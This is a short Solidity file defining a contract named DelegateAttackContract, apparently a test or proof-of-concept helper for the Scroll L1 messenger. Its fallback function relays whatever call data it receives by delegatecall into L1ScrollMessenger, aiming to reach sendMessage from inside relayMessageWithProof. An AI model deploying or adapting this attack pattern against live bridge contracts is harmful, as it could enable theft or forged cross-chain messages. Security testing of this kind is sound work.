// SPDX-License-Identifier: MIT
pragma solidity =0.8.24;

import { L1ScrollMessenger } from "../L1/L1ScrollMessenger.sol";

contract DelegateAttackContract {
    address public l1ScrollMessengerAddress;

    constructor(address _l1ScrollMessengerAddress) {
        l1ScrollMessengerAddress = _l1ScrollMessengerAddress;
    }

    // Fallback function to receive calls from L1ScrollMessenger.relayMessageWithProof
    fallback() external payable {
        // Forward the call via delegatecall to L1ScrollMessenger's sendMessage function
        // The arguments for sendMessage must beabi-encoded in the _message parameter
        // passed to L1ScrollMessenger.relayMessageWithProof
        (bool success, bytes memory result) = l1ScrollMessengerAddress.delegatecall(msg.data);
        require(success, "Delegatecall to sendMessage failed");
        // Optionally, return the result if needed, though not strictly necessary for the attack
        // assembly {
        //     return(add(result, 0x20), mload(result))
        // }
    }
}
